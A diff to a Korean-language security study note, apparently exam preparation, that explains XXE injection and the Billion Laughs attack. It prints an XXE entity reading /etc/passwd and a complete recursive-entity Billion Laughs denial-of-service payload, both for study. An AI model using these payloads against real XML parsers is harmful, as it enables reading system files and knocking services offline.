@@ -44,14 +44,37 @@
 
 ----------------------------------------------------------------------
 
-## 6. Billion laughs attack(xml lol)
+## 6. xxe injection과 Billion laughs attack(xml lol)
 #### 2017, 2020 OWASP top 10에 등록된 Xml eXternal Entities(XXE) 취약점을 활용한 공격이다. XXE 취약점이란 XML 타입의 데이터 웹 요청을 통해 전송 시 서버에서 XML 외부 엔티티 처리를 가능하게 되는 경우에 발생한다. XML을 통해 사용자가 웹 어플리케이션으로 전달되는 XML 데이터를 직접 업로드나 수정이 가능하게 되는데 이에 대한 입력값 검증 등이 제대로 이루어지지 않으면 발생한다.
-#### 2020년도 정보보안기사에 나온 xml injection attack에 대한 예시 코드로는 다음과 같다.
+#### 2020년도 정보보안기사에 나온 xml injection attack에 대한 예시 코드로는 다음과 같다. (/etc 디렉터리 하위에 passwd 파일은 리눅스/유닉스 시스템에서 계정 정보를 담고 있는 파일이다.)
 
     <!DOCTYPE foo [
     <!ENTITY xxe SYSTEM "file:///etc/passwd">
     ]>
 
-####
+#### billion laughs attack은 lol을 lol1~9가 재귀적으로 참조해서 결과적으로는 10억개의 lol을 생성해낸다. 코드로 구현하면 간단하지만 결과적으로 생성되는 문자열은 상당히 크게 때문에 효율적인 DOS공격이기도 하다. 예시 코드는 다음과 같다.
+
+<?xml version="1.0"?>
+<!DOCTYPE lolz [
+ <!ENTITY lol "lol">
+ <!ELEMENT lolz (#PCDATA)>
+ <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+ <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
+ <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+ <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
+ <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
+ <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
+ <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
+ <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
+ <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
+]>
+<lolz>&lol9;</lolz>
+
+* 참고: <https://gist.github.com/jordanpotti/04c54f7de46f2f0f0b4e6b8e5f5b01b0>, <https://leeminki.github.io/webhack/2019/02/26/WebHack_Study_20.html>
+
+----------------------------------------------------------------------
+
+## 7.
+
 
 ----------------------------------------------------------------------
